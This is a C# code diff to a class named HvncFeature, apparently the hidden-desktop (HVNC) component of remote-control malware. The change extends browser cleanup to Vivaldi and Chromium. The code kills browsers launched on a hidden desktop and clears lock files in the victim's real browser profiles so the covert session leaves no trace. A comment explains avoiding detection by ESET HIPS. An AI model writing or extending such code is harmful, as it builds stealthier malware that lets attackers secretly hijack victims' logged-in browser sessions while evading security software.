@@ -390,12 +390,14 @@ internal static class HvncFeature
         // TerminateProcess on a browser looks like a crash to ESET HIPS, which then blocks the
         // browser's profile directory on the next real-desktop launch.
         const uint PT = 0x0001; // PROCESS_TERMINATE
-        bool launchedOpera   = _launchedPids.ContainsKey("opera.exe");
-        bool launchedOperaGX = _launchedPids.ContainsKey("operagx.exe");
-        bool launchedEdge    = _launchedPids.ContainsKey("msedge.exe");
-        bool launchedChrome  = _launchedPids.ContainsKey("chrome.exe");
-        bool launchedBrave   = _launchedPids.ContainsKey("brave.exe");
-        bool launchedFirefox = _launchedPids.ContainsKey("firefox.exe");
+        bool launchedOpera    = _launchedPids.ContainsKey("opera.exe");
+        bool launchedOperaGX  = _launchedPids.ContainsKey("operagx.exe");
+        bool launchedEdge     = _launchedPids.ContainsKey("msedge.exe");
+        bool launchedChrome   = _launchedPids.ContainsKey("chrome.exe");
+        bool launchedBrave    = _launchedPids.ContainsKey("brave.exe");
+        bool launchedVivaldi  = _launchedPids.ContainsKey("vivaldi.exe");
+        bool launchedChromium = _launchedPids.ContainsKey("chromium.exe");
+        bool launchedFirefox  = _launchedPids.ContainsKey("firefox.exe");
         GracefulKillBrowsers();
         foreach (var pid in _launchedPids.Values)
         {
@@ -412,10 +414,12 @@ internal static class HvncFeature
 
         // Repair real Opera profile: fix wrong path bug + repair corrupted JSON files.
         if (launchedOpera || launchedOperaGX) RepairOperaProfileAfterHvnc();
-        if (launchedEdge)    CleanRealBrowserLock("Microsoft",    "Edge",            "User Data");
-        if (launchedChrome)  CleanRealBrowserLock("Google",       "Chrome",          "User Data");
-        if (launchedBrave)   CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data");
-        if (launchedFirefox) CleanFirefoxRealLocks();
+        if (launchedEdge)     CleanRealBrowserLock("Microsoft",    "Edge",            "User Data");
+        if (launchedChrome)   CleanRealBrowserLock("Google",       "Chrome",          "User Data");
+        if (launchedBrave)    CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data");
+        if (launchedVivaldi)  CleanRealBrowserLock("Vivaldi",                         "User Data");
+        if (launchedChromium) CleanRealBrowserLock("Chromium",                        "User Data");
+        if (launchedFirefox)  CleanFirefoxRealLocks();
     }
 
     public static void SignalAck()
